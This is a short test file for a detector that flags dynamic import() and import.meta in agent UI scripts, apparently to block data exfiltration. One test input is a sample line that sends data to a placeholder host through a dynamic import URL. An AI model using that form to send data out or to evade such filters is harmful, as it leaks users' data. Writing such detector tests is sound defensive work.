import { describe, expect, it } from "vitest";

import { referencesDynamicImport } from "@phoenix/agent/uiOperations/runtime/uiScriptWorker";

describe("referencesDynamicImport", () => {
  it("rejects dynamic import() and import.meta exfil forms", () => {
    expect(referencesDynamicImport('import("https://host/?" + data)')).toBe(
      true
    );
    expect(referencesDynamicImport("await import ( x )")).toBe(true);
    expect(referencesDynamicImport("const u = import.meta.url;")).toBe(true);
  });

  it("does not reject embedded code that merely mentions import", () => {
    // Python evaluator bodies routinely carry `import` statements as data.
    expect(referencesDynamicImport("const src = `import json\\nx = 1`;")).toBe(
      false
    );
    expect(referencesDynamicImport("importlib.reload(mod)")).toBe(false);
    expect(
      referencesDynamicImport("return ui.timeRange.set({ hours: 1 });")
    ).toBe(false);
  });
});
